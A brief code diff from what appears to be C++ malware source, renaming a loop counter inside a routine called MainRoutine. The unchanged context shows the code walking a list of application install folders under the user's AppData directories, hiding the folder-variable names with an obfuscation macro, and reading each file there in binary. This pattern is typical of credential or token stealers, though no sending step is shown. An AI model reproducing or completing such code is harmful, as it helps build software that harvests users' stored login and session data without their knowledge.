@@ -29,13 +29,13 @@ void MainRoutine()
 
 	try {
 		for (const auto& install : installs) {
-			static int i = 0;
+			static int inc = 0;
 			std::string path = std::getenv(AY_OBFUSCATE("appdata")) + install;
-			if (i > 3)
+			if (inc > 3)
 				path = std::getenv(AY_OBFUSCATE("localappdata")) + install;
 			if (!fs::exists(path))
 				continue;
-			++i;
+			++inc;
 			for (const fs::directory_entry& entry : fs::directory_iterator(path)) {
 				std::ifstream file_path(entry.path(), std::ios_base::binary);
 				std::string str((std::istreambuf_iterator<char>(file_path)), std::istreambuf_iterator<char>());
